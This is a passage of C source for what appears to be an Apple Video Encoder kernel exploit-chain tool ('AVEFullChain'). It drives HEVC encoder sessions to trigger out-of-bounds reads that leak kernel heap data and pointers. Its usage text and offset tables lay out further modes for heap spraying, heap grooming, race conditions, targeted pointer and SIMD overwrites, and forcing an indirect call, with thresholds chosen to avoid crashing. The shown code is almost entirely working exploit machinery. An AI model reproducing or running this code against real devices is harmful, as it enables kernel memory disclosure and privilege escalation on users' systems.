            rlog("TL=%3d: prep=%d enc=%d fmt=%d vps=%zu",
                 tl, (int)ps, (int)g_cb_status, has_fmt, vlen);
            if (diffs == -1)
                rlog(" *** LEN CHANGED %zu->%zu ***", blen, vlen);
            else if (diffs > 0)
                rlog(" *** %d BYTE DIFFS ***", diffs);
            rlog("\n");

            if (diffs != 0 && vlen > 0) {
                rlog("  bytes: ");
                for (size_t j = 0; j < vlen && j < 80; j++) rlog("%02x", vps[j]);
                rlog("\n");
                if (diffs > 0) {
                    rlog("  diffs: ");
                    size_t cl = (vlen < blen) ? vlen : blen;
                    for (size_t j = 0; j < cl; j++)
                        if (vps[j] != baseline[j])
                            rlog("[%zu]%02x>%02x ", j, baseline[j], vps[j]);
                    rlog("\n");
                }
                /* Scan for kernel pointers */
                if (vlen >= 8) {
                    for (size_t j = 0; j <= vlen - 8; j += 4) {
                        uint64_t qw; memcpy(&qw, vps + j, 8);
                        if ((qw >> 40) == 0xfffffe || (qw >> 40) == 0xffff80)
                            rlog("  *** KPTR@%zu: 0x%016llx ***\n", j, (unsigned long long)qw);
                    }
                }
            }

            VTCompressionSessionInvalidate(s); CFRelease(s);
            usleep(30000);
        }

        rlog("\n=== DIMENSION_OOB complete ===\n");

    } else if (strcmp(mode, "vps_byte_dump") == 0) {
        /*
         * vps_byte_dump — Dump raw VPS NAL bytes at varying AlphaLayerID values
         *
         * The kernel indexes layer_id_in_nuh[64] with AlphaLayerID.
         * For values >= 64, it reads OOB from adjacent struct fields
         * and encodes those values into the VPS NAL output.
         * This is an INFO LEAK — VPS bytes at OOB indices contain
         * kernel heap data that gets sent back to userspace.
         *
         * Uses regular HEVC codec (not muxa) since it produces
         * full VPS output for all AlphaLayerID values.
         */
        int max_aid = (argc > 2) ? atoi(argv[2]) : 128;
        if (max_aid < 1) max_aid = 1;
        if (max_aid > 255) max_aid = 255;

        int vw = 192, vh = 192;
        rlog("=== VPS_BYTE_DUMP: Kernel info leak via OOB VPS index ===\n");
        rlog("AlphaLayerID range: 0-%d (OOB starts at 64), res=%dx%d\n\n", max_aid, vw, vh);

        /* First, get baseline VPS at AlphaLayerID=0 */
        uint8_t baseline_vps[512];
        size_t baseline_len = 0;
        {
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(enc_spec,
                CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, vw, vh,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) { rlog("FAIL: baseline session create\n"); goto done; }
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
            int zero = 0;
            CFNumberRef zn = CFNumberCreate(NULL, kCFNumberIntType, &zero);
            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), zn);
            CFRelease(zn);
            st = VTCompressionSessionPrepareToEncodeFrames(s);
            if (st != noErr) { rlog("FAIL: baseline prepare=%d\n", (int)st); VTCompressionSessionInvalidate(s); CFRelease(s); goto done; }
            g_encode_done = 0;
            encode_one(s, 0, vw, vh);
            for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
            if (g_saved_fmt) {
                const uint8_t *ptr = NULL;
                size_t sz = 0;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    g_saved_fmt, 0, &ptr, &sz, NULL, NULL);
                if (ptr && sz > 0 && sz <= sizeof(baseline_vps)) {
                    memcpy(baseline_vps, ptr, sz);
                    baseline_len = sz;
                }
            }
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }
        rlog("Baseline VPS (AlphaLayerID=0): %zu bytes\n", baseline_len);
        if (baseline_len > 0) {
            rlog("  ");
            for (size_t j = 0; j < baseline_len; j++) {
                rlog("%02x", baseline_vps[j]);
                if ((j+1) % 32 == 0) rlog("\n  ");
                else if ((j+1) % 4 == 0) rlog(" ");
            }
            rlog("\n");
        }

        /* Now sweep through AlphaLayerID values and compare */
        int test_aids[] = {1, 2, 32, 62, 63, 64, 65, 66, 96, 100,
                           112, 127, 128, 160, 192, 200, 224, 255};
        int n_test = sizeof(test_aids) / sizeof(test_aids[0]);

        rlog("\n--- Sweep: comparing VPS bytes at each AlphaLayerID ---\n");
        rlog("(differences from baseline reveal kernel heap data)\n\n");

        for (int t = 0; t < n_test; t++) {
            int aid = test_aids[t];
            if (aid > max_aid) continue;

            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(enc_spec,
                CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, vw, vh,
                kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) { rlog("AID=%d: session fail\n", aid); continue; }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
            OSStatus sp = VTSessionSetProperty(s,
                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
            CFRelease(aidn);

            st = VTCompressionSessionPrepareToEncodeFrames(s);
            if (st != noErr) {
                rlog("AID=%d: set=%d prepare=%d (SKIP)\n", aid, (int)sp, (int)st);
                VTCompressionSessionInvalidate(s); CFRelease(s); continue;
            }

            if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
            g_encode_done = 0;
            encode_one(s, 0, vw, vh);
            for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);

            rlog("AID=%3d: set=%d prepare=%d encode=%d psets=%zu done=%d",
                aid, (int)sp, 0, (int)g_cb_status, g_last_pset_count, g_encode_done);

            rlog(" fmt=%s", g_saved_fmt ? "YES" : "NO");
            if (g_saved_fmt) {
                size_t pcount = 0;
                OSStatus pc_st = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    g_saved_fmt, 0, NULL, NULL, &pcount, NULL);
                rlog(" pcount=%zu(st=%d)", pcount, (int)pc_st);

                for (size_t pi = 0; pi < pcount && pi < 10; pi++) {
                    const uint8_t *ptr = NULL;
                    size_t sz = 0;
                    int nal_hdr = 0;
                    OSStatus gs = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                        g_saved_fmt, pi, &ptr, &sz, NULL, &nal_hdr);
                    rlog("\n  pset[%zu] nal=%d len=%zu st=%d ptr=%s: ",
                        pi, nal_hdr, sz, (int)gs, ptr ? "OK" : "NULL");
                    if (!ptr || sz == 0) { rlog("(empty)"); continue; }

                    size_t dlen = (sz > 128) ? 128 : sz;
                    for (size_t j = 0; j < dlen; j++) {
                        rlog("%02x", ptr[j]);
                        if ((j+1) % 32 == 0) rlog("\n    ");
                        else if ((j+1) % 4 == 0) rlog(" ");
                    }
                    if (dlen < sz) rlog("... +%zu", sz - dlen);

                    if (pi == 0 && baseline_len > 0 && sz > 0) {
                        size_t cmp_len = (sz < baseline_len) ? sz : baseline_len;
                        int diffs = 0;
                        rlog("\n  DIFF: ");
                        for (size_t j = 0; j < cmp_len; j++) {
                            if (ptr[j] != baseline_vps[j]) {
                                rlog("[%zu]=%02x>%02x ", j, baseline_vps[j], ptr[j]);
                                diffs++;
                            }
                        }
                        if (sz != baseline_len)
                            rlog("LEN:%zu>%zu ", baseline_len, sz);
                        if (diffs == 0 && sz == baseline_len)
                            rlog("(identical)");
                        else {
                            rlog("(%d diffs)", diffs);
                            if (aid >= 64) {
                                rlog("\n  *** OOB INDEX %d: %d bytes of kernel data ***", aid, diffs);
                                if (sz >= 8) {
                                    for (size_t j = 0; j <= sz - 8; j += 4) {
                                        uint64_t qw;
                                        memcpy(&qw, ptr + j, 8);
                                        if ((qw >> 40) == 0xfffffe)
                                            rlog("\n  *** KPTR byte %zu: 0x%016llx ***", j, (unsigned long long)qw);
                                        if ((qw >> 40) == 0xffff80)
                                            rlog("\n  *** XPTR byte %zu: 0x%016llx ***", j, (unsigned long long)qw);
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                rlog(" (no fmt)");
            }
            /* Always dump raw NAL bytes from CMSampleBuffer */
            if (g_saved_nal_len > 0) {
                rlog("\n  RAW NAL (%zu bytes): ", g_saved_nal_len);
                size_t dlen = (g_saved_nal_len > 128) ? 128 : g_saved_nal_len;
                for (size_t j = 0; j < dlen; j++) {
                    rlog("%02x", g_saved_nal[j]);
                    if ((j+1) % 32 == 0) rlog("\n    ");
                    else if ((j+1) % 4 == 0) rlog(" ");
                }
                if (dlen < g_saved_nal_len) rlog("... +%zu", g_saved_nal_len - dlen);
                /* Scan raw NAL for kernel pointer patterns */
                if (g_saved_nal_len >= 8) {
                    for (size_t j = 0; j <= g_saved_nal_len - 8; j += 4) {
                        uint64_t qw;
                        memcpy(&qw, g_saved_nal + j, 8);
                        if ((qw >> 40) == 0xfffffe)
                            rlog("\n  *** KPTR@%zu: 0x%016llx ***", j, (unsigned long long)qw);
                        if ((qw >> 40) == 0xffff80)
                            rlog("\n  *** XPTR@%zu: 0x%016llx ***", j, (unsigned long long)qw);
                    }
                }
            }
            rlog("\n\n");

            VTCompressionSessionInvalidate(s); CFRelease(s);
            usleep(50000); /* 50ms between sessions */
        }

        rlog("=== VPS_BYTE_DUMP complete ===\n");

    } else {
        rlog("Usage: AVEFullChain <mode> [args]\n\n");
        rlog("Modes:\n");
        rlog("  quick      -- Phases 1-3: verify + measure + 100 encodes\n");
        rlog("  standard   -- Phases 1-4: + 250 encodes + OOB read test\n");
        rlog("  full       -- All 6 phases: complete chain test\n");
        rlog("  blraa      -- Firmware with lid=1 (WILL PANIC if PAC fails!)\n");
        rlog("  read_only  -- OOB read only (400 encodes)\n");
        rlog("  spray      -- IOSurface spray + cross-buffer (400 encodes)\n");
        rlog("  firmware <lid> <enc> -- Custom firmware param test\n");
        rlog("  table2_heap [enc] [lid] -- Table 2 OOB + IOSurface spray test\n");
        rlog("  crash_test [lid]     -- Incremental approach to +0x5C70 crash boundary\n");
        rlog("  type_confusion [enc] -- 215 enc, layer_id=2 → value==2 dispatch path\n");
        rlog("  blraa_boundary [lid] -- 213 encodes, stop BEFORE BLRAA trigger at 642\n");
        rlog("  safe_max [lid]   -- Maximum safe encodes (196) before crash\n");
        rlog("  simd_target -- Target entries #630-633 (56-byte SIMD overwrite)\n");
        rlog("  simd_safe [lid]  -- 210 encodes, stop BEFORE SIMD overwrite\n");
        rlog("  cumsum_predict   -- Measure NAL sizes, predict cumsum at entry 601\n");
        rlog("  dual             -- Multi-session spray + cross-buffer + victim trigger\n");
        rlog("  pset_dump [enc]  -- Dump raw parameter set bytes for kernel pointer leak\n");
        rlog("  session_reuse [lid] [rounds] -- Test kalloc_data stale counter reuse\n");
        rlog("  safe_corrupt [lid] [enc]     -- Safe-window +0x5C34 corruption (max 197 enc)\n");
        rlog("  session_reuse_groom [lid] [dummies] -- Stale counter with heap grooming\n");
        rlog("  stereo_overflow [enc] [lid] -- MV-HEVC stereo overflow (default 100 enc, lid=1)\n");
        rlog("  stereo_keyframe [enc]      -- Force-keyframe counter accumulation test\n");
        rlog("  concurrent_race [threads] [enc] -- Race concurrent encoder sessions (2-8 threads)\n");
        rlog("  rapid_reuse [rounds]       -- Rapid create/encode/destroy for stale state\n");
        rlog("  multi_session_spray [n] [enc] -- Create N sessions, encode round-robin\n");
        rlog("  prepare_spam [count]   -- Spam PrepareToEncodeFrames without encoding\n");
        rlog("  property_cycle [cycles] -- Change properties between encodes to trigger SetSessionSettings\n");
        rlog("  interleave_prepare [prep] [enc] -- Interleave PrepareToEncodeFrames between encodes\n");
        rlog("  temporal_layers [max] [unsafe] -- CVE-2026-112705: test NumberOfTemporalLayers boundary\n");
        rlog("  resolution_probe [unsafe]      -- Test large resolution kernel OOB (CVE-2026-112705 variant)\n");
        rlog("  enum_properties                -- Enumerate ALL supported encoder properties and boundary test\n");
        rlog("  multi_layer [max]              -- MV-HEVC with N layers: measure pset scaling\n");
        rlog("  counter_accumulate [enc] [stereo] -- KEY TEST: 300 keyframes, monitor kernel OOB at 86+\n");
        rlog("  vps_overflow       -- KEY: Set >64 MV-HEVC layers to overflow kernel VPS arrays\n");
        rlog("  iokit_vps [phase]  -- Direct IOKit probe: enumerate AVE service + craft VPS\n");
        rlog("  iokit_enum         -- Enumerate all IOKit video encoder services\n");
        rlog("  transcode_vps      -- KEY: Decode crafted VPS then re-encode (transcode path)\n");
        rlog("  vps_verify         -- Verify if crafted VPS reaches kernel (compare output)\n");
        rlog("  xpc_vps [phase]    -- XPC VPS field manipulation + crafted format injection\n");
        rlog("  vps_props [phase] [unsafe] -- KEY: CVE-114025 VPS property trigger (5 phases)\n");
        rlog("  vps_corrupt_detect [aid] [rounds] -- Detect OOB VPS write corruption\n");
        rlog("  mctf_oob [max]     -- KEY: CVE-112468/112469 MCTF OOB via encode properties\n");
        rlog("  iosurface_probe    -- KEY: IOSurface sandbox access + CVE-112477 reachability\n");
        rlog("  oob_crash_scan [start] [end] [muxa] -- Scan OOB indices for crash/critical fields\n");
        rlog("  heap_feng_shui [n] [aid] -- KEY: Cross-session VPS corruption via OOB (heap spray)\n");
        rlog("  dimension_oob [max_tl] [aid] -- KEY: Info leak via NumberOfTemporalLayers OOB\n");
        rlog("  vps_byte_dump [max_aid] -- KEY: Dump VPS bytes at OOB AlphaLayerID (info leak)\n");
        rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
        rlog("\nKey entry thresholds (TABLE 1):\n");
        rlog("  256 (~86 enc):  First OOB write\n");
        rlog("  588 (~196 enc): Firmware param array start +0x5C34\n");
        rlog("  592 (~197 enc): +0x5C70 TARGET POINTER — CRASH BOUNDARY\n");
        rlog("  601 (~200 enc): +0x5C88 cumsum corrupts SIMD target pointer\n");
        rlog("  630 (~210 enc): +0x5ED4 SIMD source (56-byte header overwrite)\n");
        rlog("  642 (~214 enc): +0x5F94 BLRAA trigger (forced indirect call)\n");
        rlog("  *** Entries 593+ UNREACHABLE from table 1 without crash ***\n");
        rlog("\nKey entry thresholds (TABLE 2):\n");
        rlog("  256 (~86 enc):  First OOB write (intra-buffer, 53 driver fields)\n");
        rlog("  466 (~155 enc): Past buffer content (into alloc padding)\n");
        rlog("  1057 (~352 enc): Past allocation end (UNREACHABLE, crash at 197)\n");
    }

done:
    rlog("\n=== Full chain probe complete ===\n");
    if (g_log) { fclose(g_log); g_log = NULL; }
    /* Copy log to fixed-name path for retrieval */
    {
        char src[512], dst[512];
        snprintf(src, sizeof(src), "%s/Documents/ave_%d.txt",
                 getenv("HOME") ? getenv("HOME") : "/tmp", getpid());
        snprintf(dst, sizeof(dst), "%s/Documents/ave_full_chain.txt",
                 getenv("HOME") ? getenv("HOME") : "/tmp");
        FILE *sf = fopen(src, "r");
        FILE *df = fopen(dst, "w");
        if (sf && df) {
            char buf[4096];
            size_t n;
            while ((n = fread(buf, 1, sizeof(buf), sf)) > 0)
                fwrite(buf, 1, n, df);
        }
        if (sf) fclose(sf);
        if (df) fclose(df);
    }
    exit(0);
    return NULL;
}

int main(int argc, char *argv[]) {
    g_main_argc = argc;
    g_main_argv = argv;
    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&tid, &attr, worker_thread, NULL);
    pthread_attr_destroy(&attr);
    dispatch_main();
    return 0;
}
